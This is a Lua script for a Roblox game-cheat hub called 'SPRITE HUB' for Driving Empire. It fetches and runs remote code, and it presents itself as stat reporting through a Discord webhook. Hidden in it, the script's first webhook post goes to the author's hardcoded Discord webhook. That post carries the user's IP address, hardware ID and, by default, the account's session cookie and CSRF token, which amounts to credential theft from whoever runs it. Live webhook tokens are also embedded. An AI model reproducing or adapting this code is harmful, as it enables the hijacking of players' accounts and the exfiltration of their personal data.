repeat wait() until game.Players;
repeat wait() until game.Players.LocalPlayer;
repeat wait() until game.Players.LocalPlayer.PlayerGui;
repeat wait() until game.ReplicatedStorage;
repeat wait() until game:IsLoaded();

if game.gameId == 1202096104 then
    spawn(function()
        pcall(function()
            local RAMAccount = loadstring(game:HttpGet "https://raw.githubusercontent.com/ic3w0lf22/Roblox-Account-Manager/master/RAMAccount.lua")()
            local MyAccount = RAMAccount.new(game:GetService "Players".LocalPlayer.Name)
            local Script_Version = "1.0.7"
            local Webhook_Api = "https://discord.com/api/webhooks/".."1073750843066695720/QRz9cTl3lp6n2uogThVCZl3jHeG8U01eggsByEjftXwZDtCNV9pIwuiPe9WVKmwi-KjE" / Token Webhook (https://discord.com/api/webhooks/123456789/xxxxxxx)
            function Check_Data_Roblox_Account_Manager()
                name = "Display Name: " .. game.Players.LocalPlayer.DisplayName .. "\n"
                time = "Last: " .. os.date("!%H:%M", os.time() + 7 * 60 * 60)
                money = "Money: " .. Number_Format(game.Players.LocalPlayer.leaderstats.Cash.Value) .. " / " .. MyAccount:GetAlias() .. "\n"
                bounty = "Bounty: " .. Number_Format(game.Players.LocalPlayer.leaderstats.Bounty.Value) .. "\n"
                miles = "Miles: " .. Number_Format(game.Players.LocalPlayer.leaderstats.Miles.Value) .. "\n"
            end
            
            function Number_Format(value)
                local abbreviations = {"", "K", "M"}
                local ex = math.floor(math.log(math.max(1, math.abs(value)), 1000))
                local abbrevs = abbreviations[1 + ex] or ("e+" .. ex)
                local normal = math.floor(value * ((10 ^ 1) / (1000 ^ ex))) / (10 ^ 1)
                return ("%." .. 1 .. "f%s"):format(normal, abbrevs)
            end
            
            function Number_Comma(value)
                local formatted = value
                while true do  
                    formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
                    if (k==0) then
                        break
                    end
                end
                return formatted
            end
            
            function Check_Status_Roblox_Account_Manager(n)
                if _G.SPRITEHUB_DRIVINGEMPIRE["Roblox Account Manager"]["Enable"] then
                    if n == 1.1 then
                        return "Alias"
                    elseif n == 1.2 then
                        return MyAccount:GetAlias()
                    
                    elseif n == 2.1 then
                        return "Description"
                    elseif n == 2.2 then
                        return MyAccount:GetDescription()
                    
                    elseif n == 3.1 then
                        return "Cookie"
                    elseif n == 3.2 then
                        return MyAccount:GetCookie()
                    
                    elseif n == 4.1 then
                        return "CSRF Token"
                    elseif n == 4.2 then
                        return MyAccount:GetCSRFToken()
                    end
                end
                return ""
            end
            
            function CHECK_IP()
                return (syn and syn.request or request)({Url = 'https://api.ipify.org', Method = syn and "Get" or "GET"}).Body or "error"
            end
            
            function CHECK_HWID()
                return game:GetService("RbxAnalyticsService"):GetClientId() or "error"
            end
            
            function CHECK_GAME_NAME()
                return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "error"
            end
            
            function RB_NOTIFICATION(title, text, duration)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = title or "SPRITEHUB",
                    Text = text,
                    Duration = duration or 10,
                })
            end
            

 --Channel Id

            --------------------------------------------------------------------------------------------
            ----------------------------------------- SETTINGS -----------------------------------------
            --------------------------------------------------------------------------------------------
            if not _G.SPRITEHUB_DRIVINGEMPIRE then
                _G.SPRITEHUB_DRIVINGEMPIRE = {
                    ["Discord"] = {
                        ["Enable"] = true,--เข้า Discord อัตโนมัติ | Auto Join Discord
                        ["Invite Code"] = "dA5TzZysQp" --โค้ดคำเชิญ | Invite Code Discord
                    },
                    ["Roblox Account Manager"] = {--การตั้ง Description ในโปรแกรม Roblox Account Manager | Set Description in Roblox Account Manager
                        ["Enable"] = true, --เปิดใช้งานหรือไม่ true = เปิด / false = ปิด | Enable? true or false
                        ["Loop"] = true, --วนลูปหรือไม่ true = เปิด / false = ปิด | Loop? true or false
                        ["Delay"] = 10, --ดีเลย์ [มากกว่า 10วิ-20วิ] (วินาที) | Delay [more than 10s-20s] (Sec)
                    },
                    ["WebHook"] = {--การแจ้งเตือนผ่าน Discord | Discord Webhook Notification
                        ["Enable"] = true, --เปิดใช้งานหรือไม่ true = เปิด / false = ปิด | Enable? true or false
                        ["Link"] = "https://discord.com/api/webhooks/" .. "1080356587253792840/hVHN_qZ2_SJtg_f_xxRYWqI9gMcPGPVRzAAAlxJ5dMmlGvnFNW1qn-9HRdLOKj7_Z2Wy" --ลิงค์ Webhook | Link Webhook / Token Webhook (https://discord.com/api/webhooks/123456789/xxxxxxx)
                        --["Link"] = "123456789/xxxxxxx" / Token Webhook (https://discord.com/api/webhooks/123456789/xxxxxxx)
                    }
                }
            end
            
            if _G.SPRITEHUB_DRIVINGEMPIRE["Roblox Account Manager"]["Delay"] < 10 then
                _G.SPRITEHUB_DRIVINGEMPIRE["Roblox Account Manager"]["Delay"] = 10
                RB_NOTIFICATION("SPRITEHUB - NOTIFICATION", "Roblox Account Manager > Delay : must be more than 10", 10)
            end
            
            if _G.SPRITEHUB_DRIVINGEMPIRE["Discord"]["Enable"] then
                setclipboard("discord.gg/".._G.SPRITEHUB_DRIVINGEMPIRE["Discord"]["Invite Code"])

                local Inviter = loadstring(game:HttpGet("https://raw.githubusercontent.com/HyPerKung999/Roblox/main/Other/Roblox%20-%20Discord%20Invite.lua"))()

                Inviter.Prompt({
                    name = "SPRITE HUB",
                    invite = "dA5TzZysQp",
                })
                
                Inviter.Join("dA5TzZysQp")
            end
            
            spawn(function()
                setclipboard("discord.gg/".._G.SPRITEHUB_DRIVINGEMPIRE["Discord"]["Invite Code"])
                RB_NOTIFICATION("SPRITEHUB - DRIVING EMPIRE", "Welcome! " .. game.Players.LocalPlayer.DisplayName .. "\n(" .. CHECK_IP() .. ")", 10)
                RB_NOTIFICATION("SPRITEHUB - DRIVING EMPIRE", "Discord: discord.gg/".._G.SPRITEHUB_DRIVINGEMPIRE["Discord"]["Invite Code"], 10)
                
                local Http_Webhook_Api
                if syn then
                    Http_Webhook_Api = syn.request
                else
                    Http_Webhook_Api = request
                end
                Http_Webhook_Api({
                    Url = Webhook_Api,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode({
                        ["username"] = "SPRITE HUB : DRIVING EMPIRE",
                        ["embeds"] = {
                            {
                                ["author"] = {
                                    ["name"] = "SPRITE HUB [By.SPRITEDEV (HyPer Kung)]",
                                    ["url"] = "https://discord.gg/".._G.SPRITEHUB_DRIVINGEMPIRE["Discord"]["Invite Code"],
                                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1073316659848294503/1073665120716202085/SPRITE_DEV_JPG.png"
                                },
                                ["color"] = tonumber(0xffffff),
                                ["title"] = "SPRITE HUB : DRIVING EMPIRE",
                                ["description"] = "```" .. "\n" .. "Game: " .. CHECK_GAME_NAME() .. "\n" .. "Script Version: " .. Script_Version .. "\n" .. "Ip: " .. CHECK_IP() .. "\n" .. "Hwid: " .. CHECK_HWID() .. "```",
                                ["url"] = "https://discord.gg/".._G.SPRITEHUB_DRIVINGEMPIRE["Discord"]["Invite Code"],
                                ["fields"] = {
                                    {
                                        ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                        ["value"] = "",
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = "Info",
                                        ["value"] = "",
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                        ["value"] = "",
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = "Name",
                                        ["value"] = game.Players.LocalPlayer.Name,
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "Nick Name",
                                        ["value"] = game.Players.LocalPlayer.DisplayName,
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "Money",
                                        ["value"] = Number_Format(game.Players.LocalPlayer.leaderstats.Cash.Value),
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = "Bounty",
                                        ["value"] = Number_Format(game.Players.LocalPlayer.leaderstats.Bounty.Value),
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = "Miles",
                                        ["value"] = Number_Format(game.Players.LocalPlayer.leaderstats.Miles.Value),
                                        ['inline'] = true
                                    },
                                    {
                                        ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                        ["value"] = "",
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = "Roblox Account Manager",
                                        ["value"] = "",
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                        ["value"] = "",
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = Check_Status_Roblox_Account_Manager(1.1),
                                        ["value"] = Check_Status_Roblox_Account_Manager(1.2),
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = Check_Status_Roblox_Account_Manager(2.1),
                                        ["value"] = Check_Status_Roblox_Account_Manager(2.2),
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = Check_Status_Roblox_Account_Manager(3.1),
                                        ["value"] = Check_Status_Roblox_Account_Manager(3.2),
                                        ['inline'] = false
                                    },
                                    {
                                        ["name"] = Check_Status_Roblox_Account_Manager(4.1),
                                        ["value"] = Check_Status_Roblox_Account_Manager(4.2),
                                        ['inline'] = false
                                    },
                                },
                                ["footer"] = {
                                    ["text"] = ('วันที่: %s'):format(os.date('%d/%m/%Y | เวลา: %H:%M:%S', os.time() + 7.05 * 60 * 60)),
                                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1073316659848294503/1073665120716202085/SPRITE_DEV_JPG.png"
                                }
                            }
                        }
                    })
                })
            end)
            
            spawn(function()
                while task.wait() do
                    if _G.SPRITEHUB_DRIVINGEMPIRE["Roblox Account Manager"]["Enable"] and not _G.SPRITEHUB_DRIVINGEMPIRE["Roblox Account Manager"]["Loop"] then
                        if MyAccount then
                            Check_Data_Roblox_Account_Manager()
                            MyAccount:SetDescription(name .. money .. bounty .. miles .. time)
                            break
                        end
                    elseif _G.SPRITEHUB_DRIVINGEMPIRE["Roblox Account Manager"]["Enable"] and _G.SPRITEHUB_DRIVINGEMPIRE["Roblox Account Manager"]["Loop"] then
                        if MyAccount then
                            Check_Data_Roblox_Account_Manager()
                            MyAccount:SetDescription(name .. money .. bounty .. miles .. time)
                            Wait(_G.SPRITEHUB_DRIVINGEMPIRE["Roblox Account Manager"]["Delay"] or 10)
                        end
                    else
                        Wait(10)
                    end
                    Wait(10)
                end
            end)
            
            spawn(function()
                while task.wait() do
                    if _G.SPRITEHUB_DRIVINGEMPIRE["WebHook"]["Enable"] then
                        local Http_Webhook_Check
                        if syn then
                            Http_Webhook_Check = syn.request
                        else
                            Http_Webhook_Check = request
                        end
                        Http_Webhook_Check({
                            Url = _G.SPRITEHUB_DRIVINGEMPIRE["WebHook"]["Link"],
                            Method = "POST",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },
                            Body = game:GetService("HttpService"):JSONEncode({
                                ["username"] = "SPRITE HUB : DRIVING EMPIRE",
                                ["embeds"] = {
                                    {
                                        ["author"] = {
                                            ["name"] = "SPRITE HUB [By.SPRITEDEV (HyPer Kung)]",
                                            ["url"] = "https://discord.gg/".._G.SPRITEHUB_DRIVINGEMPIRE["Discord"]["Invite Code"],
                                            ["icon_url"] = "https://cdn.discordapp.com/attachments/1073316659848294503/1073665120716202085/SPRITE_DEV_JPG.png"
                                        },
                                        ["color"] = tonumber(0xffffff),
                                        ["title"] = "SPRITE HUB : DRIVING EMPIRE",
                                        ["description"] = "```" .. "Name: " .. game.Players.LocalPlayer.Name .. "\n" .. "Nick Name: " .. game.Players.LocalPlayer.DisplayName .. "\n" .. "```",
                                        ["url"] = "https://discord.gg/".._G.SPRITEHUB_DRIVINGEMPIRE["Discord"]["Invite Code"],
                                        ["fields"] = {
                                            {
                                                ["name"] = "Money",
                                                ["value"] = Number_Format(game.Players.LocalPlayer.leaderstats.Cash.Value),
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "Bounty",
                                                ["value"] = Number_Format(game.Players.LocalPlayer.leaderstats.Bounty.Value),
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "Bounty",
                                                ["value"] = Number_Format(game.Players.LocalPlayer.leaderstats.Miles.Value),
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                                ["value"] = "",
                                                ['inline'] = false
                                            },
                                            {
                                                ["name"] = "Money",
                                                ["value"] = Number_Comma(game.Players.LocalPlayer.leaderstats.Cash.Value),
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "Bounty",
                                                ["value"] = Number_Comma(game.Players.LocalPlayer.leaderstats.Bounty.Value),
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "Bounty",
                                                ["value"] = Number_Comma(game.Players.LocalPlayer.leaderstats.Miles.Value),
                                                ['inline'] = true
                                            },
                                            {
                                                ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                                ["value"] = "",
                                                ['inline'] = false
                                            },
                                            {
                                                ["name"] = "Roblox Account Manager",
                                                ["value"] = "",
                                                ['inline'] = false
                                            },
                                            {
                                                ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                                ["value"] = "",
                                                ['inline'] = false
                                            },
                                            {
                                                ["name"] = Check_Status_Roblox_Account_Manager(1.1),
                                                ["value"] = Check_Status_Roblox_Account_Manager(1.2),
                                                ['inline'] = false
                                            },
                                        },
                                        ["footer"] = {
                                            ["text"] = ('วันที่: %s'):format(os.date('%d/%m/%Y | เวลา: %H:%M:%S', os.time() + 7.05 * 60 * 60)),
                                            ["icon_url"] = "https://cdn.discordapp.com/attachments/1073316659848294503/1073665120716202085/SPRITE_DEV_JPG.png"
                                        }
                                    }
                                }
                            })
                        })
                    end
                    wait(30)
                end
            end)
        end)
    end)
end
